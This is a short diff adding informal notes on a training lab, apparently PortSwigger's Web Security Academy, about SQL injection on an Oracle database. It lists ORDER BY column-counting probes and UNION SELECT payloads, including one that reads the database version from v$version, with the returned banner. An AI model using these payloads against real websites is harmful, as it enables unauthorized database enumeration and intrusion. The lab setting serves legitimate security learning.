@@ -1,0 +1,31 @@
+Lab: SQL injection attack, querying the database type and version on Oracle
+
+
+
+https://0a5200c3031cc8aa8026301e00bc00b4.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories
+
+Determine the number of colums 
+(remember ctrl + u)
+
+' order by 1-- yes
+' order by 2-- 2 colums? yes
+' order by 3-- 3 colums? nope
+
+2 colums
+
+Determine de data types of the colums
+
+' UNION SELECT 'a' , 'a' FROM DUAL-- -> Oracle database
+
+DUAL to say its not a real table
+
+HTTP/2 200 OK ->  both columns text
+
+
+Output the version of the database
+
+' UNION SELECT banner , NULL FROM v$version--
+
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+
